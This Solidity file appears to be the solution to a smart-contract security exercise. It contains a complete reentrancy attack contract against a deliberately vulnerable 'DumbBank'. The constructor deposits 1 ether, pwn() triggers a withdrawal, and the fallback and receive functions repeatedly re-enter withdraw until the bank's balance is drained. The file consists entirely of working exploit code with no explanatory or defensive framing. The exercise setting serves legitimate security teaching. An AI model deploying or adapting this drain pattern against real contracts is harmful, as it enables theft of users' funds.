// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../DumbBankRobber.sol";

contract AttackContract {
    IDumbBank dumbBank;
    uint256 public constant WITHDRAWAL_AMOUNT = 1 ether;

    constructor(IDumbBank _dumbBank) payable {
        dumbBank = _dumbBank;
        _dumbBank.deposit{value: WITHDRAWAL_AMOUNT}();
    }

    function pwn() external {
        dumbBank.withdraw(WITHDRAWAL_AMOUNT);
    }

    fallback() external payable {
        uint256 bankBalance = address(dumbBank).balance;
        if (bankBalance >= WITHDRAWAL_AMOUNT) {
            dumbBank.withdraw(WITHDRAWAL_AMOUNT);
        }
    }

    receive() external payable {
        uint256 bankBalance = address(dumbBank).balance;
        if (bankBalance >= WITHDRAWAL_AMOUNT) {
            dumbBank.withdraw(WITHDRAWAL_AMOUNT);
        }
    }
}